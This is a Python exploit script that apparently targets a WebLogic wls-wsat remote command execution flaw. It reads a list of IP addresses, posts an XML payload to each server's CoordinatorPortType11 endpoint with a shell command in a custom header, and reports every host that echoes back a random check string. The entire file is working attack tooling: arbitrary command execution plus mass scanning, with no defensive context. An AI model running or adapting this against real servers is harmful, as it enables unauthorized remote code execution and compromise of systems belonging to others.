import requests
import sys
import time
import random
import threading
def exec_cmd(ip,cmd):
	url="http://"+ip+"/wls-wsat/CoordinatorPortType11"
	headers={
	'User-Agent': 'Apache-HttpClient/4.1.1 (java 1.5)',
	'CMD' : cmd,
	'SOAPAction':'""',
	'Content-Type':'text/xml'
	}
	with open('payload.txt','rb') as f :
		payloads=f.read()
	r=requests.post(url,headers=headers,data=payloads,timeout=5)
	return r.content.decode()
def test_poc(ip):
	check=str(int(time.time())+int(random.uniform(1000,9999)))
	out=exec_cmd(ip,'echo '+check)
	if check in out:
		print('vul finds:'+ip)
def main(): 
	print("put ips in ip.txt ")
	with open('ip.txt') as f:
		for line in f.readlines():
			try:
				test_poc(line)
			except :
				pass
	print("End")		
if __name__ == '__main__':
	main()